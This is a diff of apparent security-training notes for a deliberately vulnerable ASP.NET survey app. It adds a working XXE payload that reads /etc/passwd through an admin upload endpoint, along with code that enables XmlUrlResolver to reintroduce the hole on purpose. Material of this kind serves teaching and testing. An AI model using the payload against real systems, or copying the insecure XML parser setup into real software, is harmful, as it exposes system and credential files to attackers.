@@ -142,20 +142,22 @@ public IActionResult SurveyReport([FromForm] string surveyName)
 ################
 # INSECURE DESERIALIZATION ASVS 5.5
 ################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# XXE Example 5.5.2
+# /Admin/SurveyResponse/upload
+# Try to upload this content:
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE example [<!ELEMENT example ANY><!ENTITY file SYSTEM "file:///c:/ps/appsettings.json">]><example>&file;</example>
+<!DOCTYPE example [<!ELEMENT example ANY><!ENTITY file SYSTEM "file:///etc/passwd">]><example>&file;</example>
+# With protection enabled, you get XmlException: For security reasons DTD is prohibited 
+# Modify Areas>Admin>Controllers>SurveyResponseController.cs, Upload POST method with this
+ [HttpPost("Admin/SurveyResponse/upload")]
+        public IActionResult Upload(string xmlContent)
+        {
+            var xmlDocument = new XmlDocument();
+            xmlDocument.XmlResolver = new XmlUrlResolver(); 
+            xmlDocument.LoadXml(xmlContent);
+            string output = xmlDocument.InnerText;
+
+            return View("uploadResponse", output);
+        }
+
+
